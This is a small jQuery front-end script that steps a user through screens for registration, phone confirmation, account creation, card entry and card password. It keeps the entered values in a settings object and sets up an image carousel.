/*global $, register*/
const render = (root) => {
    root.empty();
    const wrapper = $('<div class="wrapper container"></div>');
    root.append(wrapper);
    
    if (settings.screen === null) {
        wrapper.append(register(_ => {
            render(root);
        }));
    } else if (settings.screen === 0) {
        wrapper.append(numForm(_ => {
            render(root)
        }));
    } else if (settings.screen === 1) {
        wrapper.append(confirmation(_ => {
            render(root)
        }));
    } else if (settings.screen === 2) {
        wrapper.append(account(_ => {
            render(root)
        }));
    } else if (settings.screen === 3) {
        wrapper.append(success(_ => {
            render(root)
        }));
    } else if (settings.screen === 4) {
        wrapper.append(card(_ => {
            render(root)
        }));
    } else if (settings.screen === 5) {
        wrapper.append(cardPassword(_ => {
            render(root)
        }));
    } else if (settings.screen === 6) {
        wrapper.append(Final());
    }
};

const settings = {
    screen: null,
    validation: false,
    name: null,
    email: null,
    password: null,
    phone: null,
    terms: false,
    code: null,
    card: null,
    cardPassword: null,
    month: null,
    year: null
};

$(_ => {
    const root = $('#root');
    render(root);
    $('.owl-carousel').owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 1
            },
            1000: {
                items: 1
            }
        }
    });
});